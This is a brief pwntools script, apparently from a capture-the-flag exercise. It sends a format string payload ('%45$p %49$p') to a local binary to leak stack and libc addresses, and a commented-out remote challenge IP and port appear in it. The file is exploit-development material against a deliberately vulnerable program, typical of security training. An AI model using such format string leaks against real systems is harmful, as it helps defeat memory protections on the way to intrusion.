#!/bin/python3

from pwn import *
import binascii

#sh = process("./format")
# IP = "206.189.16.135"
# PORT = 30227 
# sh = remote(IP, PORT)

sh = process("./format")

#libc start main addr: position 49 (from gdb and long %p input comparision with vmmap)
payload = "%45$p "
payload += "%49$p "

print("[SENDING] {}".format(payload))
sh.sendline(payload)

ans = sh.recv(1024)
print("[RECEIVE] {}".format(ans))



